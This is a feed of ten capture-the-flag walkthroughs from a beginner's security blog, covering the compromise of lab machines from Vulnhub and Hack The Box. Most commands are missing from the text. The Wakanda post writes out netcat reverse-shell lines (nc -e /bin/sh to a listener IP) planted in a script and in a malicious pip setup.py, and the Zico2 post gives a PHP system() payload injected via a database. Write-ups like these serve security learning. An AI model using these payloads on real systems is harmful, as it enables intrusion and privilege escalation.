channel.title: Root Network Security
channel.description: Beginners's journey through the world of security, programming and system administration. In love with GNU/Linux and cryptography.

item.title: Vulnhub.com - Bulldog: 1
item.description:
Welcome back to another challenge, which is Bulldog machine from Vulnhub.

  • Author: Nick Frichette
  • Download: https://www.vulnhub.com/entry/bulldog-1,211/

Solution

Start the scan with nmap.

As we can see, there are three open ports, two http running on ports 80 and 8080 and ssh running on port 23.

Let’s start by enumerating the web service on port 80.

Great, at the bottom of the source code we have hashes commented out. Pasting them into the Crackstation gave us this results.

So our cracked credentials are as follow.

But unluckily, none of these work on ssh. From there, I decided to run a brute force attack against directories with dirb.

Directory named admin? Seems interesting, let’s try that.

We can authenticate straight away with previously gathered credentials, but there is nothing in the service so I decided to move on and go to the /dev/shell web page. It’s essential that you’re logged into the admin as the shell won’t grant you the access.

Before anything, I decided to check other pages found by dirb.

But not much of a clue there. Let’s poke into the system with shell as much as we can.

In addition, we can reveal the source code of the shell.

Back to the shell. After many tries, I found out that you can execute commands with echo using echo $(COMMAND) syntax.

Unfortunately, simple reverse shell with netcat does not work.

My next step was python reverse shell, but we cannot enter ; characters into the command, application will detect it and stop us. Simple way to bypass that is to paste the reverse shell into the file on our host machine, set up a SimpleHTTPServer and use wget to get the file.

Now we can wget the file using the shell.

By running it, we get that sweet unrestricted shell.

Now let’s find something that will allow us to escalate privilages into the root.

So it seems we have a binary to reverse engineer. Firstly, I’ll start SimpleHTTPServer to copy it into my Kali machine.

Then we can use radare to try and crack it.

Hey, we don’t even have to reverse engineer that! Looking for strings we can see sudo su root, and the string that seems to be a password to the root account.

Is it SUPERultiHmatePASHSWORDyouHCANTget? Nope, but after few different tries, getting rid of this ood H letters got me lucky.

Now we can get the flag.

item.title: Vulnhub.com - Jarbas
item.description:
This time our goal is to attack another machine from Vulnhub called Jarbas.

  • Author: Tiago Tavares
  • Download: https://www.vulnhub.com/entry/jarbas-1,232/

Solution

Let’s start with nmap scan.

From this scan, we can see a bunch of open ports, but we can start from the usual port 80 with http service.

After visiting this website, we are presented with this old school looking page.

But I could not find anything useful, after which I decided to check another port 8080 with another http server.

From the source code, we can see that the websiite redirects to /login?from=%2F directory. Let’s check that with the browser.

So we have information that the service running is Jenkins but apart from brute forcing credentials, we do not have any more information.

After that I decided to check the MariaDB database hosted on port 3306.

Still, nothing there. At that point I decided to run a gobuster against web servers looking for directories, and then for files with .php or .html extensions.

Here we have, first find! Let’s look at access.html.

Cracking the hashes easily reveals all of them.

Now after trying these credentials, eder worked and we are logged into the Jenkins.

But what can we do with it? There was a `/script/ directory allowing us to run any script we enter into the text box.

I use code from HighOnCoffe blog, which will allow me to execute commands.

We can see that the code executes, showing us jenkins as the output. I tried the same with id command.

Now we are sure that the commands are executed properly. My next step was to run some Java Reverse Shell.

And with our listener, we catch the connection.

One thing I’ve noticed during usual enumeration is en entry in crontab, executing a bash script every 5 minutes with root privilages.

I decided to try and put into that script a Python reverse shell snippet, that will give us back a root shell.

Great, now let’s set up a listener and wait for the new run of the script.

item.title: Hackthebox - Celestial
item.description:
This time we’re going to have fun with a machine called Celestial, which is fun little box.

Solution

Let’s start from a simple nmap scan.

From here we can see one port open - 3000 with service called ppp. But actaully, using curl on it yields us a 404 error code.

But, actually visiting this website second time (both times in a browser) gives us a completely different website.

I decided to fire up burp, in which we can see a profile cookie set, which looks like a base64 encoded string.

Decoding it gives us data, which is shown on the website.

In addition, from nikto scan, we can see that the server is running Express which is probably Express + NodeJS combination.

From here we can just use google and find about this awesome RCE exploit in NodeJS unserialization.

As we’ve done the same exploit in previos machine from Vulnhub, I decided to already move on to the reverse shell, cloned from this repository.

Now we just have to correctly append the rce data into the cookie.

Using burp repeater, we can firstly base64 encode the cookie, and then send the contents to the website.

Here’s the response.

In the meantime our previously set up listener catched the connection from the server.

We can spawn a better shell with python and look for user.txt flag.

Now we can try and find a way to escalate. First this that we can see is the changing modified date for output.txt file in the home directory of our user.

In the same directory as the flag was script.py which output seemed to be put into the output.txt file. We can leverage our privilages to write this file by placing malicious python script that will ls the content of /root directory. After waiting for the next execution, we will have the desired output.

By waiting for another execution, we know where is flag for the root. Now let’s view it using the same trick.

At last, delete the output.txt and empty the script to do not share the flag with other attackers.

item.title: Vulnhub.com - Ch4inrulz
item.description:
Today we’re going to walk through a machine from Vulnhub called Ch4inrulz.

  • Author: mohammadaskar2
  • Download: https://www.vulnhub.com/entry/ch4inrulz-101,247/

Solution

Firstly, we can do an nmap scan.

We can see a whole range of open ports 80 and 8011 for http servers, 21 for ftp and 22 for ssh. From the start I decided to check the ftp port for some publicly available files.

Unfortunately there’s nothing in there, so my next step was to check http at port 80. As it’s pretty normal landing page, I decided to run a dirb scan for directories.

Here, we can see a development directory, which is protected by password, so I decided to move on and scan another http port - 8011.

An /api/ directory? Let’s check that.

By checking all of these files, only files_api.php is present.

We can see that it needs a file parameter, which we can do with curl and /etc/passwd file.

Hmmm, it blocks our request. After a while of trying out different things, I’ve noticed that changing GET TO POST will allow us to return the correct ouptut - contents of /etc/passwd.

Okay, so as we can read files with that api, why don’t we try and read the content of the index in development area?

More information, there’s possibly a tool to upload files. But still, we need to get access so we can use it. For now only reading is possible.

But as the protection is from the web server itself, we could possibly find information about in .htaccess file.

Great, let’s get the .htpasswd file with the password to protected area.

Now we can crack the password with johntheripper.

Not a hard password to brute force.

After logging in in, we can already move to the /uploader tool as previously discovered.

By uploading some test files, I’ve noticed that we can only upload images. But we can try to trick it by getting php-reverse-shell and adding gif file header into the exploit.

In addition, we have to change the extension of the shell.

Now we have to find the upload path. This was the most time consuming part as dirb and gobuster with different wordlists didn’t seem to find anything valuable. In addition, there were no clues in the system.

After a few hours, I’ve found that my uploads may be just frank uploads. Still nothing, so after few more hours of fiddling, here we have FRANKuploads. We can now get to our uploaded reverse shell with file api, while running a listener.

First flag is in the home direcotory of frank user.

Now we have to get to the higher privileges. During usual enumeration, I’ve noticed that the only unusal thing in this system is outdated kernel.

Now we just have to exlpoit the system using this exploit.

item.title: Vulnhub.com - Zico2
item.description:
In this post we’re going to finish a quick machine from Vulnhub called Zico2.

  • Author: rafasantos5
  • Download: https://www.vulnhub.com/entry/zico2-1,210/

Solution

As always, let’s start from the usual nmap scan.

From the results, we can see three open ports - ssh, http and rpcbind. With that information we can continue enumeration on port 80 and scan the website hosted on this machine.

Scanning with dirb shows interesting directory dbadmin, let’s take a look at it.

Googling for the name of the service phpLiteAdmin v1.9.3 returned a default password, with which we can log into the panel.

While looking for information, I’ve noticed a table containg hashes of users.

Being able to crack them, I decided to connect to ssh, but with no luck.

Moving on with attack, we can use this exploit in order to execute commands. Steps are simple.

  1. We create a db named “share.php”.
  2. Now create a new table in this database and insert a text field with the default value: <?php echo(system("whoami"))?>

In addition, in view.php we have a LFI vulnerability allowing us to view any file in the system.

Now let’s see if our code has executed.

It’s working! Now we can see if nc is installed in order to execute a reverse shell.

And as it’s installed, let’s prepare the reverse tcp shell.

Now we simply have to get it from our Kali machine and execute it.

Viewing this website just the same way as previously got us a reverse shell.

Now we just have to escalate to another user. I decided to firstly, check out the home directory, which will show what other users are on the system.

That’s a lot of files to look at. Let’s start with to_do.txt.

So zico user tried different CMSs. We can check what’s inside this directories, starting from Wordpress as it’s the one that I’m most familiar.

We have a password to the database. With that, we can try to log in to ssh server.

And after checking what commands user is able to execute with sudo, both tar and zip commands are available.

Doing another bit of searching I’ve noticed a cool way to execute commands with tar. Check it out here.

item.title: Vulnhub.com - Wakanda
item.description:
In this post we’re going to walk through an amazing box from Vulnhub called Wakanda.

  • Author: xMagass
  • Download: https://www.vulnhub.com/entry/wakanda-1,251/

Solution

From start we’re going to do an nmap scan.

We can already see 2 interesting services - ssh on port 3333 and http on port 80. In the meantime I decide to run a gobuster scan against the web page as I couldn’t find anything useful on my own.

We can see a whole number of websites, but actually looking at them with curl shows that most of them are just empty files.

Coming back to the main page, we have a commented out link that will change the language of the content.

As we know that there is a file called fr.php we can suspect that the script running behind this page will append .php extension to anything we pass with parameter.

I decided to look for some vulnerabilities for this type of situation and came up with this paper. With this, we can leak the source code of the pages.

Now we can decode the source.

Hey, that’s the message showing up when we change the language! We can do the same with index.php file.

And decode the source.

We have the password!

As I suspect it’s for ssh, we now have to get the username. My first guess wass niamey.

But it did not work out, so I decided to check mamadou as it’s the possible creator.

At the login we are greeted with the python interpreter, but we can easily spawn the bash shell with pty. Now it’s time for more enumeration.

And the first flag! Two more to go.

In /home directory we can see another user devops, with a second flag inside his directory. While looking for some more clues, I found test file in /tmp.

It’s owner is devops, so I decided to find more files that he’s an owner of.

Hey, it’s a python script in /srv/ directory. I decided to change it with os.system('nc -e /bin/sh 10.0.0.4 1337') that will spawn a reverse shell whenever the script is executed, but I could not find any cronjobs that could execute it. To my amusement, after coming back after a small break, I’ve noticed a shell in my listener.

Now we have a second flag, but what executed this file? I decided to look for the files containing antivirus.py in it.

Oh, so there it is! Restarted every 300 seconds, a service that will run the antivirus. As this is completed, let’s move to escalation to root.

We can run as pip as root, which makes our search much easier. While googling, I’ve found this technique to execute command with pip.

Let’s download setup.py as instructed and change the base64 encoded string into simple os.system('nc -e /bin/sh 10.0.0.4 443'). Here is our modified script in fakepip directory.

Now we’re ready to install the package.

And what’s in our listener?

And we have a flag!

item.title: Vulnhub.com - Lampião
item.description:
Let’s start another quick machine from Vulnhub called Lampião.

  • Author: Tiago Tavares
  • Download: https://www.vulnhub.com/entry/lampiao-1,249/

Solution

Let’s start with nmap scan.

From here we can see that both ssh and http services are open. We can start with the web service, and see what’s inside the web page using curl.

Unfortunately, both dirb and any tries to enumerate this website failed.

I decided to run another nmap scan with -p- option scanning all possible ports.

Yup, now we can see another http service running on Apache httpd 2.4.7, port 1898. Website is powered by Drupal 7, so that’s something to remember too.

In the main page, I’ve noticed a strange post.

We can see that node 2 is not working, so after looking at the url of the first post, we can simply move on to the second one.

Now it’s time to find these files. After trying different directories, looking for default Drupal upload directories, I’ve found it in the main directory of the website.

Luckily, we have another file called audio.m4a. Listening to it gives:

Amazing, we have username! Now it’s time to mess with the password. I could not find it anywhere in the web page, so here we can start with a hydra. As I did not want to run attack with whole rockyou.txt wordlist, I decided to check wiht some smaller ones, but with no luck.

To the rescue came a trick with custom wordlists, learned from Mr. Robot machine from Vulnhub. Remember cewl. First node has lots of text, so let’s pack it into a wordlist.

Now we can run hydra.

Great, we have it! Unfortunately, even this part took a lot of time as the password is not for Drupal account, but for ssh and finding that was pure luck.

Part for the privilage escalation was quite brutal, as none of the methods did not find anyhting useful, as I do not like using kernel exploits. They are always a last attack, but that was a case in this machine, using version of Dirty Cow from here.

Now we can log in to root and find the flag.

Still I don’t know if it’s intended solution, but I’m welcome to any suggestions.

item.title: Hackthebox - Valentine
item.description:
Today we’re going to walk through the machine from Hackthebox called Valentine.

Solution

Firstly, let’s run a quick nmap scan to get some open ports.

From here we can start analyzing http and https services.

Both of them show the same image.

It’s a logo of heartbleed attack! To make sure that the service is vulnerable, we can run another nmap scan with --script=ssl-heartbleed option.

I decided to try out two tools - this python script exploiting this vulnerability and metasploit to try and gather as much information as possible.

Now we can use this tool to simply get the leaked data.

We can see that there is a $text variable encoded in base64.

Some text, let’s save it for later and move to metasploit in order to use their scanner.

Great, we have the private key! Will we be able to log in using it and the string encoded during the previous attack?

Unfortunately not. After a few hours of more enumeration, I’ve noticed another directory in website, together with a notes.txt file.

In there we have another file.

After converting these values to ASCII system (hex -> ascii), we have another private key.

Let’s save it once again and try to connect to ssh.

Now let’s find a way to escalate to root.

We have a dev_sess socket, with root owner, but group is hype. That means we can connect it, as we’re in the same group. Let’s try it with tmux command (you can find it also while checking out bash history).

item.title: Vulnhub.com - Temple Of Doom 1
item.description:
Today we’re going to walk through very cool machine from Vulnhub called Temple of Doom.

  • Author: 0katz
  • Download: https://www.vulnhub.com/entry/temple-of-doom-1,243/

Big thanks to the author for creating this challenge and for Vulnhub for hosting and curating this great set of machines!

Solution

Firstly, as always we’re going to start with the nmap scan.

  • -v - verbose output
  • -sS - TCP-SYN scan
  • -A - OS detection, version detection and traceroute
  • -T4 - aggresive scan

At the start I decided to check out port 666 running NodeJS Express.

As the content of the website doesn’t tell us much, I decided to run nikto scan in the background.

In the meantime, while manually looking around at the webiste, I’ve noticed that at the second visit we get different content. In burpsuite we can also notice a profile cookie.

As the cookie is base64 encoded let’s decode it.

In addition we get the unexpected token error, let’s fix it by adding quotation marks at the start of the date.

Sending it with repeater in BurpSuite, we immediately notice that the content of the website is correctly rendered.

But this brings another attack vector that I remember from another machine - bug in unserialize function in NodeJS leading to remote code execution. You can read more here.

Firstly, let’s create a reverse shell using this nodejsshell.py with our IP and port to connect.

Now we’re ready to add it into the cookie.

And now it’s just a matter of encoding it with base64 and sending back with repeater. Don’t forget to set up a listener!

We heave the connection. Great!

Now we’re ready to escalate. Firstly I decided to check out crontab. Nothing interesting there.

But in /etc/passwd I notice that there is another user.

I decided to check whether or not we can escalate to him, looking at different files, etc. However, while viewing running processes, I’ve noticed something strange.

We can see that fireman is running ss-manager as root. Googling for this service shows me this awesome exploit technique. Read more here.

Following snippet will execute a nc reverse shell to our Kali machine.

Now to our listener.

Now as a part of my regular privilage escalation enumeration, using sudo -l I’ve found these 3 commands that we can run as a root.

After doing a bit of research I came across this article, showing us how we can execute a command using a tcpdump tool. Firstly, I add only simple id command in order to check whether or not will this technique work.

Now We can execute it and see the results.

Now we can use it to make another reverse shell (simply calling /bin/bash didn’t work).

And to the flag, here we go!

item.title: Vulnhub.com - Toppo: 1
item.description:
Today we’re going to work through easy machine from Vulnhub called Toppo. If you don’t have time, but still want to get these shells, just try this machine.

  • Author: Hadi Mene
  • Download: https://www.vulnhub.com/entry/toppo_1,245/

Big thanks to the author for creating this challenge and for Vulnhub for hosting and curating this great set of machines!

Solution

Firstly let’s start with our usual nmap scan in order to view the open ports on this machine.

What parameters I’m using?

  • -v - verbose output
  • -sS - TCP-SYN scan
  • -A - OS detection, version detection and traceroute
  • -T4 - aggresive scan
  • -p- - scan all 65535 ports

From here I can see only one service that’s worth looking at the start, which is http running on port 80. While looking manually at the website, I decided to run nikto to scan the website.

Here we have, an /admin/ directory. Inside there was a note in notes.txt file.

At first I thought about enumerating more in order to find the username, as we already have the password. But stupid me overthought this part way too much.

I didn’t notice that the username is already in the password. Like what was I thinking, ted can be the username, and it probably will as this is easy machine.

Of course that the password works. Now we have to escalate our privilages. Here comes good old G0tm1k post and while trying different steps I’ve noticed this entry in /etc/sudoers file.

Now I decided to check whether nc is installed on the system.

And now we can use simple system() function from awk in order to run the reverse shell with nc.

Now we can look at the ouputu of the previously started listener.
